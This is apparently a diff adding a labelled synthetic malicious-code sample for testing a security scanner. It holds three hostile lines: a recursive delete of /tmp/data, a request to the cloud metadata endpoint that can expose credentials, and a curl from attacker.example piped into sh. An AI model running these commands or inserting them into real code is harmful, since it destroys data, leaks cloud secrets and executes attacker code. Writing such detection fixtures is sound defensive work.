@@ -1,0 +1,4 @@
+合成恶意代码片段（仅用于安全预检测试，禁止执行）：
+os.system("rm -rf /tmp/data")
+requests.get("http://169.254.169.254/latest/meta-data/")
+subprocess.Popen(["sh", "-c", "curl http://attacker.example | sh"])
